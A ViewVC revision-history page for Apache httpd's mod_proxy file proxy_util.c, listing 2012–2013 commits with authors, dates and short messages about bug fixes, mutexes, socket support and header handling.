- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1530792)

Modified
*Wed Oct 9 21:08:55 2013 UTC*
(11 years, 3 months ago)
by *trawick*

File length: 117351 byte(s)

Diff to [previous 1530603](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1530603&r2=1530792)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1530603&r2=1530792&diff_format=h))
```
follow-up to [r1530603](/viewvc?view=revision&revision=1530603): fix typo/syntax error

```

---

Revision [**1530603**](/viewvc?view=revision&revision=1530603) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1530603&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1530603&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1530603))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1530603)

Modified
*Wed Oct 9 13:38:45 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 117352 byte(s)

Diff to [previous 1526189](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1526189&r2=1530603)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1526189&r2=1530603&diff_format=h))
```
ping tuning via Yann Ylavic <ylavic.dev@gmail.com>

```

---

Revision [**1526189**](/viewvc?view=revision&revision=1526189) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1526189&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1526189&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1526189))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1526189)

Modified
*Wed Sep 25 14:29:02 2013 UTC*
(11 years, 4 months ago)
by *trawick*

File length: 117235 byte(s)

Diff to [previous 1517025](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1517025&r2=1526189)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1517025&r2=1526189&diff_format=h))
```
mod_proxy: Add ap_connection_reusable() for checking if a connection
is reusable as of this point in processing.

mod_proxy_fcgi uses the new API to determine if FCGI_CONN_CLOSE
should be enabled, but that doesn't change existing behavior
since the connection is currently marked for closure elsewhere
in the module.

```

---

Revision [**1517025**](/viewvc?view=revision&revision=1517025) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1517025&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1517025&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1517025))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1517025)

Modified
*Fri Aug 23 20:41:41 2013 UTC*
(11 years, 5 months ago)
by *jailletc36*

File length: 117066 byte(s)

Diff to [previous 1516930](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1516930&r2=1517025)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1516930&r2=1517025&diff_format=h))
```
No need to lower the string before removing the path, it is just a waste of time.

```

---

Revision [**1516930**](/viewvc?view=revision&revision=1516930) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1516930&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1516930&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1516930))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1516930)

Modified
*Fri Aug 23 16:48:42 2013 UTC*
(11 years, 5 months ago)
by *jim*

File length: 117066 byte(s)

Diff to [previous 1516911](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1516911&r2=1516930)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1516911&r2=1516930&diff_format=h))
```
Allow for a simple socket check in addition to the
higher level protocol-level checks for backends...

Not sure if it makes sense to do both or not... Comments?

```

---

Revision [**1516911**](/viewvc?view=revision&revision=1516911) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1516911&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1516911&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1516911))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1516911)

Modified
*Fri Aug 23 16:00:47 2013 UTC*
(11 years, 5 months ago)
by *jim*

File length: 117021 byte(s)

Diff to [previous 1513508](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1513508&r2=1516911)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1513508&r2=1516911&diff_format=h))
```
Save some cycles...

```

---

Revision [**1513508**](/viewvc?view=revision&revision=1513508) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1513508&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1513508&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1513508))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1513508)

Modified
*Tue Aug 13 14:35:47 2013 UTC*
(11 years, 5 months ago)
by *druggeri*

File length: 116892 byte(s)

Diff to [previous 1508416](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1508416&r2=1513508)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1508416&r2=1513508&diff_format=h))
```
UDS subsequent request on a connection fix

```

---

Revision [**1508416**](/viewvc?view=revision&revision=1508416) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1508416&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1508416&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1508416))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1508416)

Modified
*Tue Jul 30 12:33:12 2013 UTC*
(11 years, 5 months ago)
by *trawick*

File length: 116846 byte(s)

Diff to [previous 1503991](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1503991&r2=1508416)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1503991&r2=1508416&diff_format=h))
```
s/seperate/separate/g

```

---

Revision [**1503991**](/viewvc?view=revision&revision=1503991) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1503991&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1503991&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1503991))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1503991)

Modified
*Wed Jul 17 04:54:49 2013 UTC*
(11 years, 6 months ago)
by *jailletc36*

File length: 116846 byte(s)

Diff to [previous 1500437](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1500437&r2=1503991)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1500437&r2=1503991&diff_format=h))
```
Potential use of uninitialized memory.
Point 3 of PR 54936

```

---

Revision [**1500437**](/viewvc?view=revision&revision=1500437) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1500437&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1500437&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1500437))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1500437)

Modified
*Sun Jul 7 14:05:37 2013 UTC*
(11 years, 6 months ago)
by *jim*

File length: 116839 byte(s)

Diff to [previous 1490994](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1490994&r2=1500437)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1490994&r2=1500437&diff_format=h))
```
conf->mutex is not used... Also, ensure that pool
use is protected

```

---

Revision [**1490994**](/viewvc?view=revision&revision=1490994) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1490994&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1490994&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1490994))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1490994)

Modified
*Sat Jun 8 14:58:53 2013 UTC*
(11 years, 7 months ago)
by *jailletc36*

File length: 116839 byte(s)

Diff to [previous 1482859](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482859&r2=1490994)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482859&r2=1490994&diff_format=h))
```
NULL terminate the right buffer

```

---

Revision [**1482859**](/viewvc?view=revision&revision=1482859) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482859&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482859&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1482859))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1482859)

Modified
*Wed May 15 14:13:15 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 116833 byte(s)

Diff to [previous 1482555](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482555&r2=1482859)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482555&r2=1482859&diff_format=h))
```
mod_proxy: Use a global mutex for handling workers.

```

---

Revision [**1482555**](/viewvc?view=revision&revision=1482555) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482555&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482555&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1482555))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1482555)

Modified
*Tue May 14 20:16:59 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 116898 byte(s)

Diff to [previous 1482522](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482522&r2=1482555)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482522&r2=1482555&diff_format=h))
```
mod_proxy: Make sure we skip empty tokens when parsing the Connection
header.

```

---

Revision [**1482522**](/viewvc?view=revision&revision=1482522) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482522&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482522&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1482522))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1482522)

Modified
*Tue May 14 18:58:06 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 116945 byte(s)

Diff to [previous 1482170](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482170&r2=1482522)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482170&r2=1482522&diff_format=h))
```
core: Stop the HTTP_IN filter from attempting to write error buckets
to the output filters, which is bogus in the proxy case. Create a
clean mapping from APR codes to HTTP status codes, and use it where
needed.

```

---

Revision [**1482170**](/viewvc?view=revision&revision=1482170) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482170&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482170&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1482170))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1482170)

Modified
*Tue May 14 01:53:53 2013 UTC*
(11 years, 8 months ago)
by *fuankg*

File length: 116904 byte(s)

Diff to [previous 1482075](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482075&r2=1482170)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1482075&r2=1482170&diff_format=h))
```
hunk 1: C89 please;
hunk 2: optional functions are usually declared static.

```

---

Revision [**1482075**](/viewvc?view=revision&revision=1482075) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482075&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1482075&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1482075))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1482075)

Modified
*Mon May 13 20:11:36 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 116903 byte(s)

Diff to [previous 1481891](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1481891&r2=1482075)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1481891&r2=1482075&diff_format=h))
```
mod_proxy, mod_proxy_http: Connection headers must be stripped on the way
in and out, support an optional function to handle this.

```

---

Revision [**1481891**](/viewvc?view=revision&revision=1481891) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1481891&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1481891&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1481891))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1481891)

Modified
*Mon May 13 14:45:49 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 116257 byte(s)

Diff to [previous 1480627](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1480627&r2=1481891)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1480627&r2=1481891&diff_format=h))
```
mod_proxy: Ensure we don't attempt to amend a table we are iterating
through, ensuring that all headers listed by Connection are removed.

```

---

Revision [**1480627**](/viewvc?view=revision&revision=1480627) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1480627&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1480627&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1480627))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1480627)

Modified
*Thu May 9 13:33:02 2013 UTC*
(11 years, 8 months ago)
by *jim*

File length: 116244 byte(s)

Diff to [previous 1480058](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1480058&r2=1480627)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1480058&r2=1480627&diff_format=h))
```
Mod_proxy used the global pool w/o mutex. fix.

```

---

Revision [**1480058**](/viewvc?view=revision&revision=1480058) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1480058&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1480058&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1480058))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1480058)

Modified
*Tue May 7 20:27:37 2013 UTC*
(11 years, 8 months ago)
by *minfrin*

File length: 115831 byte(s)

Diff to [previous 1463455](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1463455&r2=1480058)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1463455&r2=1480058&diff_format=h))
```
mod_proxy: Ensure network errors detected by the proxy are returned as
504 Gateway Timout as opposed to 502 Bad Gateway, in order to be
compliant with RFC2616 14.9.4 Cache Revalidation and Reload Controls.

[Reverted by [r1884280](/viewvc?view=revision&revision=1884280)]

```

---

Revision [**1463455**](/viewvc?view=revision&revision=1463455) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1463455&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1463455&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1463455))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1463455)

Modified
*Tue Apr 2 09:18:01 2013 UTC*
(11 years, 9 months ago)
by *rpluem*

File length: 115871 byte(s)

Diff to [previous 1462269](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1462269&r2=1463455)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1462269&r2=1463455&diff_format=h))
```
* Always try to reuse the address looked up for the worker if we are allowed to
  reuse the address. This saves DNS lookups.

```

---

Revision [**1462269**](/viewvc?view=revision&revision=1462269) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1462269&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1462269&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1462269))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1462269)

Modified
*Thu Mar 28 19:36:03 2013 UTC*
(11 years, 10 months ago)
by *rpluem*

File length: 115791 byte(s)

Diff to [previous 1453981](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1453981&r2=1462269)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1453981&r2=1462269&diff_format=h))
```
* Improve reusage of already resolved addresses to avoid unnecessary DNS lookups.

```

---

Revision [**1453981**](/viewvc?view=revision&revision=1453981) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1453981&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1453981&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1453981))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1453981)

Modified
*Thu Mar 7 17:50:47 2013 UTC*
(11 years, 10 months ago)
by *jim*

File length: 115335 byte(s)

Diff to [previous 1453875](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1453875&r2=1453981)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1453875&r2=1453981&diff_format=h))
```
message tag for dom sock

```

---

Revision [**1453875**](/viewvc?view=revision&revision=1453875) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1453875&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1453875&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1453875))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1453875)

Modified
*Thu Mar 7 14:06:51 2013 UTC*
(11 years, 10 months ago)
by *jim*

File length: 115325 byte(s)

Diff to [previous 1452259](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1452259&r2=1453875)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1452259&r2=1453875&diff_format=h))
```
Pull out duplicated code to proxy_util...

```

---

Revision [**1452259**](/viewvc?view=revision&revision=1452259) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1452259&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1452259&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1452259))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1452259)

Modified
*Mon Mar 4 11:26:17 2013 UTC*
(11 years, 10 months ago)
by *jim*

File length: 101935 byte(s)

Diff to [previous 1451921](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1451921&r2=1452259)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1451921&r2=1452259&diff_format=h))
```
apr trunk-able

```

---

Revision [**1451921**](/viewvc?view=revision&revision=1451921) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1451921&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1451921&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1451921))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1451921)

Modified
*Sat Mar 2 19:17:14 2013 UTC*
(11 years, 10 months ago)
by *fuankg*

File length: 101900 byte(s)

Diff to [previous 1451905](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1451905&r2=1451921)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1451905&r2=1451921&diff_format=h))
```
Follow-up to [r1451905](/viewvc?view=revision&revision=1451905) to fix NetWare/Windows compilation.

```

---

Revision [**1451905**](/viewvc?view=revision&revision=1451905) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1451905&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1451905&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1451905))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1451905)

Modified
*Sat Mar 2 17:07:23 2013 UTC*
(11 years, 10 months ago)
by *jim*

File length: 101871 byte(s)

Diff to [previous 1451633](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1451633&r2=1451905)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1451633&r2=1451905&diff_format=h))
```
Make AF_UNIX aware... fix Windows/Netware??

```

---

Revision [**1451633**](/viewvc?view=revision&revision=1451633) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1451633&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1451633&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1451633))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1451633)

Modified
*Fri Mar 1 16:21:49 2013 UTC*
(11 years, 10 months ago)
by *jim*

File length: 101826 byte(s)

Diff to [previous 1428916](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1428916&r2=1451633)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1428916&r2=1451633&diff_format=h))
```
Add in rough uds support (Bugx 54101) from Blaise Tarr <blaise.tarr@gmail.com>

```

---

Revision [**1428916**](/viewvc?view=revision&revision=1428916) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1428916&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1428916&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1428916))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1428916)

Modified
*Fri Jan 4 15:10:21 2013 UTC*
(12 years ago)
by *jim*

File length: 98059 byte(s)

Diff to [previous 1421953](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1421953&r2=1428916)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1421953&r2=1428916&diff_format=h))
```
non-existance of byrequests is not an immediate error

```

---

Revision [**1421953**](/viewvc?view=revision&revision=1421953) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1421953&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1421953&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1421953))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1421953)

Modified
*Fri Dec 14 16:14:06 2012 UTC*
(12 years, 1 month ago)
by *jim*

File length: 97712 byte(s)

Diff to [previous 1407085](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1407085&r2=1421953)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1407085&r2=1421953&diff_format=h))
```
Allow for searching w/i shm slots for a specific worker and balancer

```

---

Revision [**1407085**](/viewvc?view=revision&revision=1407085) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1407085&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1407085&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1407085))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1407085)

Modified
*Thu Nov 8 14:01:37 2012 UTC*
(12 years, 2 months ago)
by *jim*

File length: 96134 byte(s)

Diff to [previous 1404653](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1404653&r2=1407085)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1404653&r2=1407085&diff_format=h))
```
better logging for re-use/use of shm

```

---

Revision [**1404653**](/viewvc?view=revision&revision=1404653) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1404653&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1404653&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1404653))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1404653)

Modified
*Thu Nov 1 16:06:43 2012 UTC*
(12 years, 2 months ago)
by *jim*

File length: 95603 byte(s)

Diff to [previous 1387607](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1387607&r2=1404653)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1387607&r2=1404653&diff_format=h))
```
Allow for setting of sticky session split char...
Bugz 53893

```

---

Revision [**1387607**](/viewvc?view=revision&revision=1387607) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1387607&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1387607&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1387607))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1387607)

Modified
*Wed Sep 19 14:18:19 2012 UTC*
(12 years, 4 months ago)
by *jim*

File length: 95566 byte(s)

Diff to [previous 1387444](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1387444&r2=1387607)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1387444&r2=1387607&diff_format=h))
```
Log whether or not the restore from shm actually
resulted in a match of shm data, or whether it
was stale.

```

---

Revision [**1387444**](/viewvc?view=revision&revision=1387444) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1387444&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1387444&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1387444))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1387444)

Modified
*Wed Sep 19 03:51:25 2012 UTC*
(12 years, 4 months ago)
by *jim*

File length: 95166 byte(s)

Diff to [previous 1387110](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1387110&r2=1387444)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1387110&r2=1387444&diff_format=h))
```
Use identifying server_rec info when we know we have
unique and useful data :)

```

---

Revision [**1387110**](/viewvc?view=revision&revision=1387110) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1387110&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1387110&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1387110))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1387110)

Modified
*Tue Sep 18 12:15:50 2012 UTC*
(12 years, 4 months ago)
by *jim*

File length: 95063 byte(s)

Diff to [previous 1386578](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1386578&r2=1387110)
